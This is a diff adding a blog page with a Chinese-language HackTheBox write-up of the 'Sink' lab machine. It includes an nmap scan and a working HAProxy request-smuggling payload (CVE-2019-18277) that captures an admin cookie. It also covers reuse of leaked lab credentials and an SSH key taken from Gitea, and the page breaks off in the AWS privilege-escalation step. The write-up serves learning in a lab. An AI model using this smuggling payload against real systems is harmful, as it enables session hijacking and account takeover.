@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="en,zh-CN,default">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="0x00 题目介绍Sink是HackTheBox上一道难度是insane的Linux靶机，做了很久HackTheBox，第一次做insane难度的，还是学到了很多东西的，在这里跟大家分享一下。 题目主要涉及到的知识点是：  HAProxy HTTP request smuggling (CVE-2019-18277) Git commit log AWS CLI Configure">
+<meta name="keywords" content="Hackthebox">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox--Sink">
+<meta property="og:url" content="http://yoursite.com/2021/07/22/Hackthebox--Sink/index.html">
+<meta property="og:site_name" content="C0debreak&#39;s Blog">
+<meta property="og:description" content="0x00 题目介绍Sink是HackTheBox上一道难度是insane的Linux靶机，做了很久HackTheBox，第一次做insane难度的，还是学到了很多东西的，在这里跟大家分享一下。 题目主要涉及到的知识点是：  HAProxy HTTP request smuggling (CVE-2019-18277) Git commit log AWS CLI Configure">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/4PiqJFC9sbmdLRI.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/Gq2lcLdMhQRnsmP.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/GNJlHOhtKpZo4CV.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/JDMWezjU5u7yOPI.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/ntDv39SGsThbHaY.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/MAJmVRDFY71yUkq.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/xgDLNaKRsIC37k8.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/IclK3reodgju7ND.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/W9xEmAQwPjKCZia.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/v1fObmGA8ZEMkFD.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/co5gzKIqAXwuETM.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/nOV7fl1yMZTwKq6.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/7vRsTmqzhVjpeUH.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/8NdkXBOtziC92Sh.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/KE5JCrYMh8D1sz4.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/apAnVIKfxR3kyY9.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/T7fKgpCzs1DUNtX.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/GgjapP5qrUVNYFx.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/F1YQmjNeGocSh4a.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/Y5VDurCoU92SWms.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/jyUFiYuSvKGTNRl.png">
+<meta property="og:image" content="https://i.loli.net/2021/07/22/dHwBtEIrnOQ6k1p.png">
+<meta property="og:updated_time" content="2021-07-21T17:06:34.366Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hackthebox--Sink">
+<meta name="twitter:description" content="0x00 题目介绍Sink是HackTheBox上一道难度是insane的Linux靶机，做了很久HackTheBox，第一次做insane难度的，还是学到了很多东西的，在这里跟大家分享一下。 题目主要涉及到的知识点是：  HAProxy HTTP request smuggling (CVE-2019-18277) Git commit log AWS CLI Configure">
+<meta name="twitter:image" content="https://i.loli.net/2021/07/22/4PiqJFC9sbmdLRI.png">
+
+<link rel="canonical" href="http://yoursite.com/2021/07/22/Hackthebox--Sink/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Hackthebox--Sink | C0debreak's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">C0debreak's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Fchestnut" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/07/22/Hackthebox--Sink/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="P0tato">
+      <meta itemprop="description" content>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0debreak's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hackthebox--Sink
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-07-22 01:06:48 / Modified: 01:06:34" itemprop="dateCreated datePublished" datetime="2021-07-22T01:06:48+08:00">2021-07-22</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Hackthebox/" itemprop="url" rel="index"><span itemprop="name">Hackthebox</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="0x00-题目介绍"><a href="#0x00-题目介绍" class="headerlink" title="0x00 题目介绍"></a>0x00 题目介绍</h2><p>Sink是<code>HackTheBox</code>上一道难度是<code>insane</code>的<code>Linux</code>靶机，做了很久<code>HackTheBox</code>，第一次做<code>insane</code>难度的，还是学到了很多东西的，在这里跟大家分享一下。</p>
+<p>题目主要涉及到的知识点是：</p>
+<ul>
+<li>HAProxy HTTP request smuggling (CVE-2019-18277)</li>
+<li>Git commit log</li>
+<li>AWS CLI Configure</li>
+</ul>
+<p><img src="https://i.loli.net/2021/07/22/4PiqJFC9sbmdLRI.png" alt="image.png"></p>
+<a id="more"></a>
+
+<h2 id="0x01-Port-Scan"><a href="#0x01-Port-Scan" class="headerlink" title="0x01 Port Scan"></a>0x01 Port Scan</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="comment"># nmap -sC -sV -oA sink 10.129.71.3</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-06 00:00 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.71.3</span><br><span class="line">Host is up (0.26s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)</span><br><span class="line">|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)</span><br><span class="line">|_  256 18:<span class="built_in">cd</span>:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)</span><br><span class="line">3000/tcp open  ppp?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines, Help: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Content-Type: text/html; charset=UTF-8</span><br><span class="line">|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647</span><br><span class="line">|     Set-Cookie: i_like_gitea=7d01b54d4b74326b; Path=/; HttpOnly</span><br><span class="line">|     Set-Cookie: _csrf=fzBuPyYXciKNMjoU74_PH6UmsMU6MTYyNTUwMDg1NzUxOTkyOTA4OQ; Path=/; Expires=Tue, 06 Jul 2021 16:00:57 GMT; HttpOnly</span><br><span class="line">|     X-Frame-Options: SAMEORIGIN</span><br><span class="line">|     Date: Mon, 05 Jul 2021 16:00:57 GMT</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.0 404 Not Found</span><br><span class="line">|     Content-Type: text/html; charset=UTF-8</span><br><span class="line">|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647</span><br><span class="line">|     Set-Cookie: i_like_gitea=5a24776cc4ce15ce; Path=/; HttpOnly</span><br><span class="line">|     Set-Cookie: _csrf=Naj5fDxJz0wmhymfl7zrTjDvfrI6MTYyNTUwMDg2NDgyNDg1NDY3MQ; Path=/; Expires=Tue, 06 Jul 2021 16:01:04 GMT; HttpOnly</span><br><span class="line">|     X-Frame-Options: SAMEORIGIN</span><br><span class="line">|     Date: Mon, 05 Jul 2021 16:01:04 GMT</span><br><span class="line">|     <!DOCTYPE html></span><br><span class="line">|     <html lang="<span" class="string">"en-US"</html></span> class=<span class="string">"theme-"</span>><br><span class="line">|     <head data-suburl="<span" class="string"><meta name="generator" content="Hexo 3.9.0">""</head></span>><br><span class="line">|     <meta charset="<span" class="string">"utf-8"</span>><br><span class="line">|     <meta name="<span" class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1"</span>><br><span class="line">|     <meta http-equiv="<span" class="string">"x-ua-compatible"</span> content=<span class="string">"ie=edge"</span>><br><span class="line">|     <title>Page Not Found - Gitea: Git with a cup of tea </title></span><br><span class="line">|     <link rel="<span" class="string">"manifest"</span> href=<span class="string">"/manifest.json"</span> crossorigin=<span class="string">"use-credentials"</span>><br><span class="line">|     <meta name="<span" class="string">"theme-color"</span> content=<span class="string">"#6cc644"</span>><br><span class="line">|     <meta name="<span" class="string">"author"</span> content=<span class="string">"Gitea - Git with a cup of tea"</span> /><br><span class="line">|_    <meta name="<span" class="string">"description"</span> content=<span class="string">"Gitea (Git with a c</span><br><span class="line"><span class="string">5000/tcp open  http    Gunicorn 20.0.0</span></span><br><span class="line"><span class="string">|_http-server-header: gunicorn/20.0.0</span></span><br><span class="line"><span class="string">|_http-title: Sink Devops</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>开放的主要是3000和5000端口，3000端口为<code>Gitea</code>的网站，5000端口为<code>Gunicorn</code>的网站。3000端口的网站需要登录，但是我们没有掌握任何登录凭证，所以先看下5000端口网站。</p>
+<h2 id="0x02-Port-5000-Gunicorn"><a href="#0x02-Port-5000-Gunicorn" class="headerlink" title="0x02 Port 5000 - Gunicorn"></a>0x02 Port 5000 - Gunicorn</h2><p>5000端口网站可以注册账户，先尝试注册用户登录抓包看下</p>
+<p><img src="https://i.loli.net/2021/07/22/Gq2lcLdMhQRnsmP.png" alt="image.png"></p>
+<p>看到抓包中<code>response</code>包含了<code>haproxy</code>和<code>gunicorn</code></p>
+<p><img src="https://i.loli.net/2021/07/22/GNJlHOhtKpZo4CV.png" alt="image.png"></p>
+<p>登录后页面可以发布评论。<code>Google</code>了下发现存在一个HAProxy HTTP request smuggling (CVE-2019-18277)的漏洞，通过HTTP请求走私发送构造的特定的评论请求，可以获取到其他用户发送的HTTP请求中的隐私信息。</p>
+<p><img src="https://i.loli.net/2021/07/22/JDMWezjU5u7yOPI.png" alt="image.png"></p>
+<h3 id="HAProxy-HTTP-request-smuggling-CVE-2019-18277"><a href="#HAProxy-HTTP-request-smuggling-CVE-2019-18277" class="headerlink" title="HAProxy HTTP request smuggling (CVE-2019-18277)"></a>HAProxy HTTP request smuggling (CVE-2019-18277)</h3><p>HAProxy在处理<code>request header</code>中的<code>Transfer-Encoding</code>和<code>Content-Length</code>时存在问题，如果在请求头中同时添加了<code>Transfer-Encoding</code>和<code>Content-Length</code>，并且在<code>Transfer-Encoding</code>的<code>chunked</code>字段前添加了<code>\x0b</code>或者<code>\x0c</code>时，HAProxy会错误的将带有<code>Transfer-Encoding</code>和<code>Content-Length</code>的请求发送给后端处理。此时因为后端将请求作为<code>Transfer-Encoding</code>格式的请求解析，即会在检测到类似<code>0\r\n\r\n</code>之后结束当前请求。</p>
+<p>发送给HAProxy的请求：</p>
+<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:1080</span><br><span class="line"><span class="attribute">Content-Length</span>: 6</span><br><span class="line"><span class="attribute">Transfer-Encoding:[\x0b]chunked</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">X</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>发送给后端处理的请求：</p>
+<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:1080</span><br><span class="line"><span class="attribute">Content-Length</span>: 6</span><br><span class="line"><span class="attribute">Transfer-Encoding:</span></span><br><span class="line">                  chunked</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 172.21.0.1</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">X</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>当然利用的前提是必须要在HAProxy配置中配置<code>http-reuse always</code>，并在发送请求时在<code>header</code>中配置<code>Connection: keep-alive</code>。</p>
+<p>利用请求走私可以绕过前端服务器的安全控制、获取其他用户请求、利用反射型xss、进行缓存投毒等，具体在这里不再展开，可以参考这篇文章：</p>
+<blockquote>
+<p><a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">https://paper.seebug.org/1048/</a></p>
+</blockquote>
+<h3 id="admin-cookie-steal"><a href="#admin-cookie-steal" class="headerlink" title="admin cookie steal"></a>admin cookie steal</h3><p>利用上面的<code>HAProxy HTTP request smuggling</code>的漏洞，如果我们在构造的恶意请求之后，其他用户也进行了请求，那我们就可以通过走私一个恶意请求，将其他用户的请求的信息拼接到走私请求之后，并存储到网站中，我们再查看这些数据，就能获取用户的请求中的隐私信息了。</p>
+<p><img src="https://i.loli.net/2021/07/22/ntDv39SGsThbHaY.png" alt="image.png"></p>
+<p>我们在<code>repeater</code>中构造一下请求</p>
+<figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/comment</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.129.71.3:5000</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 8</span><br><span class="line"><span class="attribute">Origin</span>: http://10.129.71.3:5000</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Referer</span>: http://10.129.71.3:5000/home</span><br><span class="line"><span class="attribute">Cookie</span>: lang=en-US; i_like_gitea=ec51054dc539d89a; session=eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ.YO2r8w.8rq5TXqG7LkEYJV3cqVwOBTIh7o; _csrf=cQKWFLPhRfTeyypUg38t8RbxoUY6MTYyNjE4ODM1OTEzNDc4OTczMw</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: Cwo=chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">5</span></span><br><span class="line">msg=test</span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">POST /comment HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.129.71.3:5000</span><br><span class="line"><span class="attribute">Cookie</span>: lang=en-US; i_like_gitea=ec51054dc539d89a; session=eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ.YO2r8w.8rq5TXqG7LkEYJV3cqVwOBTIh7o; _csrf=cQKWFLPhRfTeyypUg38t8RbxoUY6MTYyNjE4ODM1OTEzNDc4OTczMw</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 8</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"></span><br><span class="line">msg=</span><br></pre></td></tr></tbody></table></figure>
+
+<p>后面这部分POST请求即为我们走私的请求，因为需要在<code>Transfer-Encoding</code>的<code>chunked</code>前面加<code>\x0b</code>，我们先添加<code>Cwo=</code>，然后在<code>burp</code>中<code>shift+ctrl+b</code> <code>(base64 decode)</code>即可，或者直接在<code>burp</code>中添加<code>[\x0b]</code>也可以。发送后我们在评论处可以看到一条新的评论，包含了这个用户的cookie。</p>
+<p><img src="https://i.loli.net/2021/07/22/MAJmVRDFY71yUkq.png" alt="image.png"></p>
+<p><code>Cookie editor</code>替换一下，即可以获得<code>admin@sink.htb</code>的权限。</p>
+<p><img src="https://i.loli.net/2021/07/22/xgDLNaKRsIC37k8.png" alt="image.png"></p>
+<h3 id="Credentials"><a href="#Credentials" class="headerlink" title="Credentials"></a>Credentials</h3><p>在<code>Notes</code>中可以获得三部分<code>Credentials</code>:</p>
+<figure class="highlight ada"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Chef Login : <span class="type">http</span>://chef.sink.htb Username : <span class="type">chefadm</span> Password : /6'<span class="type">fEGC</span>&zEx{<span class="number">4</span>]zz</span><br><span class="line"></span><br><span class="line">Dev Node URL : <span class="type">http</span>://code.sink.htb Username : <span class="type">root</span> Password : <span class="type">FaH</span>@<span class="number">3</span>L>Z3})zzfQ3</span><br><span class="line"></span><br><span class="line">Nagios URL : <span class="type">https</span>://nagios.sink.htb Username : <span class="type">nagios_adm</span> Password : <span class="type">g8</span><h6gk\{*l.fb3c< span><br></h6gk\{*l.fb3c<></span></pre></td></tr></tbody></table></figure>
+
+<h2 id="0x03-Port-3000-Gitea"><a href="#0x03-Port-3000-Gitea" class="headerlink" title="0x03 Port 3000 - Gitea"></a>0x03 Port 3000 - Gitea</h2><p>经过尝试，发现使用<code>root/FaH@3L>Z3})zzfQ3</code>这个密码可以成功登录3000端口的<code>Gitea</code>：</p>
+<p><img src="https://i.loli.net/2021/07/22/IclK3reodgju7ND.png" alt="image.png"></p>
+<p><code>Gitea</code>是一个类似<code>git</code>的代码托管平台，在几个主要的<code>Repositories</code>里看了下，发现<code>key management</code>中似乎有一些秘钥信息</p>
+<p><img src="https://i.loli.net/2021/07/22/W9xEmAQwPjKCZia.png" alt="image.png"></p>
+<p>发现是用户<code>marcus</code>提交的<code>ssh</code>私钥</p>
+<p><img src="https://i.loli.net/2021/07/22/v1fObmGA8ZEMkFD.png" alt="image.png"></p>
+<h3 id="User-marcus"><a href="#User-marcus" class="headerlink" title="User -marcus"></a>User -marcus</h3><p>将私钥拷到本地，并修改权限为600，<code>ssh</code>尝试连接<code>marcus</code>用户成功</p>
+<p><img src="https://i.loli.net/2021/07/22/co5gzKIqAXwuETM.png" alt="image.png"></p>
+<p><code>ls</code>当前目录发现<code>user.txt</code>，获得第一个<code>flag</code></p>
+<p><img src="https://i.loli.net/2021/07/22/nOV7fl1yMZTwKq6.png" alt="image.png"></p>
+<h2 id="0x04-Privilege-Escalation"><a href="#0x04-Privilege-Escalation" class="headerlink" title="0x04 Privilege Escalation"></a>0x04 Privilege Escalation</h2><p>根据<code>Key Management</code>可以发现，存在一些<code>AWS</code>的操作；同样在<code>Log Management</code>中，发现了<code>marcus</code>删除<code>AWS</code>相关配置的<code>key</code>和<code>secret</code>的提交记录</p>
+<p><img src="https://i.loli.net/2021/07/22/7vRsTmqzhVjpeUH.png" alt="image.png"></p>
+<p>顺着可以找到之前提交的配置的相关代码</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Aws</span>\<span class="title">CloudWatchLogs</span>\<span class="title">CloudWatchLogsClient</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Aws</span>\<span class="title">Exception</span>\<span class="title">AwsException</span>;</span><br><span class="line"></span><br><span class="line">$client = <span class="keyword">new</span> CloudWatchLogsClient([</span><br><span class="line">	<span class="string">'region'</span> => <span 